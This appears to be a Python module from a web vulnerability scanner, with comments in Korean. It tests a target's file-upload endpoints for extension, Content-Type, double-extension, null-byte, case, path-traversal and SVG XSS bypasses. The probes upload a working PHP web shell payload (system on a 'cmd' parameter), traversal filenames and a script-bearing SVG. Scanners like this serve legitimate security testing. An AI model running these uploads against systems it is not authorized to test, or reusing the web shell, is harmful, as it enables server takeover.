"""
File Upload Security Scanner
파일 업로드 검증 우회 및 악성 파일 업로드 탐지
"""
import requests
import io

def scan(target_url):
    result = {
        'name': 'File Upload Bypass',
        'category': 'File Upload',
        'status': 'SAFE',
        'severity': 'CRITICAL',
        'vulnerabilities': [],
        'recommendation': 'Content-Type 검증, 파일 확장자 화이트리스트, 파일 크기 제한, 바이러스 스캔',
        'details': ''
    }

    details = []

    # 파일 업로드 엔드포인트
    upload_endpoints = [
        "/api/teams/1/files",
        "/api/boards/files",
        "/api/files/upload",
        "/api/upload",
    ]

    # 1. 악성 확장자 업로드 시도
    details.append("[File Upload-1] 악성 확장자 업로드")

    malicious_extensions = [
        ('test.php', 'application/x-php', 'PHP script'),
        ('test.jsp', 'application/jsp', 'JSP script'),
        ('test.asp', 'application/x-asp', 'ASP script'),
        ('test.exe', 'application/x-msdownload', 'Executable'),
        ('test.sh', 'application/x-sh', 'Shell script'),
        ('test.bat', 'application/x-bat', 'Batch file'),
        ('test.py', 'text/x-python', 'Python script'),
        ('test.js', 'application/javascript', 'JavaScript'),
    ]

    for endpoint in upload_endpoints:
        try:
            url = f"{target_url}{endpoint}"

            for filename, content_type, file_desc in malicious_extensions:
                try:
                    files = {
                        'file': (filename, b'<?php system($_GET["cmd"]); ?>', content_type)
                    }

                    resp = requests.post(url, files=files, timeout=5)

                    if resp.status_code in [200, 201]:
                        result['vulnerabilities'].append(f"악성 확장자 업로드 가능: {filename}")
                        details.append(f"  ✗ {filename} 업로드 성공 ({file_desc})")
                        result['status'] = 'VULNERABLE'
                        break

                except:
                    pass

            if result['status'] == 'VULNERABLE':
                break

        except:
            pass

    if result['status'] == 'SAFE':
        details.append("  ✓ 악성 확장자 차단됨")

    # 2. Content-Type 조작
    details.append("\n[File Upload-2] Content-Type 조작")

    try:
        url = f"{target_url}/api/teams/1/files"

        # PHP 파일을 image/png로 위장
        files = {
            'file': ('malicious.php', b'<?php phpinfo(); ?>', 'image/png')
        }

        resp = requests.post(url, files=files, timeout=5)

        if resp.status_code in [200, 201]:
            result['vulnerabilities'].append("Content-Type 검증 우회")
            details.append(f"  ✗ .php 파일을 image/png로 위장하여 업로드 성공")
            result['status'] = 'VULNERABLE'
        else:
            details.append(f"  ✓ Content-Type 조작 차단됨")

    except:
        details.append(f"  • Content-Type 테스트 실패")

    # 3. 이중 확장자 우회
    details.append("\n[File Upload-3] 이중 확장자 우회")

    double_extension_files = [
        'test.php.jpg',
        'test.jsp.png',
        'test.exe.pdf',
        'test.asp.gif',
        'shell.php.txt',
    ]

    for endpoint in upload_endpoints:
        try:
            url = f"{target_url}{endpoint}"

            for filename in double_extension_files:
                try:
                    files = {
                        'file': (filename, b'malicious content', 'image/jpeg')
                    }

                    resp = requests.post(url, files=files, timeout=5)

                    if resp.status_code in [200, 201]:
                        result['vulnerabilities'].append(f"이중 확장자 업로드: {filename}")
                        details.append(f"  ✗ {filename} 업로드 성공")
                        result['status'] = 'VULNERABLE'
                        break

                except:
                    pass

            if result['status'] == 'VULNERABLE':
                break

        except:
            pass

    if result['status'] != 'VULNERABLE':
        details.append("  ✓ 이중 확장자 차단됨")

    # 4. 파일 크기 제한 우회
    details.append("\n[File Upload-4] 파일 크기 제한")

    try:
        url = f"{target_url}/api/teams/1/files"

        # 11MB 파일 (제한이 10MB라고 가정)
        large_file_size = 11 * 1024 * 1024  # 11MB
        large_content = b'A' * large_file_size

        files = {
            'file': ('large.txt', large_content, 'text/plain')
        }

        resp = requests.post(url, files=files, timeout=10)

        if resp.status_code in [200, 201]:
            result['vulnerabilities'].append("파일 크기 제한 없음")
            details.append(f"  ✗ 11MB 파일 업로드 성공")
            result['status'] = 'VULNERABLE'
        elif resp.status_code == 413:  # Payload Too Large
            details.append(f"  ✓ 파일 크기 제한 작동 (413)")
        else:
            details.append(f"  ✓ 파일 크기 제한됨 ({resp.status_code})")

    except:
        details.append(f"  • 파일 크기 테스트 실패")

    # 5. Null Byte Injection
    details.append("\n[File Upload-5] Null Byte Injection")

    try:
        url = f"{target_url}/api/teams/1/files"

        # test.php%00.jpg
        null_byte_filename = "test.php\x00.jpg"

        files = {
            'file': (null_byte_filename, b'<?php echo "null byte"; ?>', 'image/jpeg')
        }

        resp = requests.post(url, files=files, timeout=5)

        if resp.status_code in [200, 201]:
            result['vulnerabilities'].append("Null Byte Injection 가능")
            details.append(f"  ✗ Null Byte로 확장자 검증 우회")
            result['status'] = 'VULNERABLE'
        else:
            details.append(f"  ✓ Null Byte 차단됨")

    except:
        details.append(f"  • Null Byte 테스트 실패")

    # 6. 파일명 길이 제한
    details.append("\n[File Upload-6] 파일명 길이 제한")

    try:
        url = f"{target_url}/api/teams/1/files"

        # 매우 긴 파일명
        long_filename = "A" * 500 + ".txt"

        files = {
            'file': (long_filename, b'test content', 'text/plain')
        }

        resp = requests.post(url, files=files, timeout=5)

        if resp.status_code in [200, 201]:
            result['vulnerabilities'].append("파일명 길이 제한 없음")
            details.append(f"  ⚠ 500자 파일명 업로드 가능 (DoS 취약)")
        else:
            details.append(f"  ✓ 파일명 길이 제한됨")

    except:
        details.append(f"  • 파일명 길이 테스트 실패")

    # 7. MIME 타입 불일치
    details.append("\n[File Upload-7] MIME 타입 검증")

    try:
        url = f"{target_url}/api/teams/1/files"

        # .jpg 파일이지만 내용은 텍스트
        files = {
            'file': ('fake_image.jpg', b'This is not an image', 'image/jpeg')
        }

        resp = requests.post(url, files=files, timeout=5)

        if resp.status_code in [200, 201]:
            result['vulnerabilities'].append("MIME 타입 검증 미흡")
            details.append(f"  ⚠ 파일 내용과 확장자 불일치 허용")
        else:
            details.append(f"  ✓ MIME 타입 검증됨")

    except:
        details.append(f"  • MIME 타입 테스트 실패")

    # 8. 대소문자 우회
    details.append("\n[File Upload-8] 대소문자 우회")

    case_bypass_files = [
        'test.PHP',
        'test.PhP',
        'test.pHp',
        'test.EXE',
        'test.JSP',
    ]

    for endpoint in upload_endpoints:
        try:
            url = f"{target_url}{endpoint}"

            for filename in case_bypass_files:
                try:
                    files = {
                        'file': (filename, b'test', 'application/octet-stream')
                    }

                    resp = requests.post(url, files=files, timeout=5)

                    if resp.status_code in [200, 201]:
                        result['vulnerabilities'].append(f"대소문자 우회: {filename}")
                        details.append(f"  ✗ {filename} 업로드 성공 (대소문자 검증 안 됨)")
                        result['status'] = 'VULNERABLE'
                        break

                except:
                    pass

            if result['status'] == 'VULNERABLE':
                break

        except:
            pass

    if result['status'] != 'VULNERABLE':
        details.append("  ✓ 대소문자 구분 검증됨")

    # 9. 경로 순회 시도
    details.append("\n[File Upload-9] 경로 순회")

    path_traversal_files = [
        '../../../evil.php',
        '..\\..\\..\\evil.exe',
        'folder/../../../shell.jsp',
    ]

    for endpoint in upload_endpoints:
        try:
            url = f"{target_url}{endpoint}"

            for filename in path_traversal_files:
                try:
                    files = {
                        'file': (filename, b'malicious', 'text/plain')
                    }

                    resp = requests.post(url, files=files, timeout=5)

                    if resp.status_code in [200, 201]:
                        result['vulnerabilities'].append("파일명 경로 순회 가능")
                        details.append(f"  ✗ 경로 순회 문자 허용: {filename}")
                        result['status'] = 'VULNERABLE'
                        break

                except:
                    pass

            if result['status'] == 'VULNERABLE':
                break

        except:
            pass

    if result['status'] != 'VULNERABLE':
        details.append("  ✓ 경로 순회 차단됨")

    # 10. SVG XSS
    details.append("\n[File Upload-10] SVG XSS")

    try:
        url = f"{target_url}/api/teams/1/files"

        svg_xss_content = b'''<svg xmlns="http://www.w3.org/2000/svg">
            <script>alert('XSS')</script>
        </svg>'''

        files = {
            'file': ('xss.svg', svg_xss_content, 'image/svg+xml')
        }

        resp = requests.post(url, files=files, timeout=5)

        if resp.status_code in [200, 201]:
            result['vulnerabilities'].append("SVG 파일에 스크립트 포함 가능")
            details.append(f"  ⚠ SVG 파일 내 스크립트 업로드 가능 (XSS 취약)")
        else:
            details.append(f"  ✓ SVG 파일 필터링됨")

    except:
        details.append(f"  • SVG 테스트 실패")

    if result['status'] == 'SAFE':
        details.append("\n✓ 파일 업로드 보안이 적절히 구현되어 있습니다")

    result['details'] = '\n'.join(details)
    return result
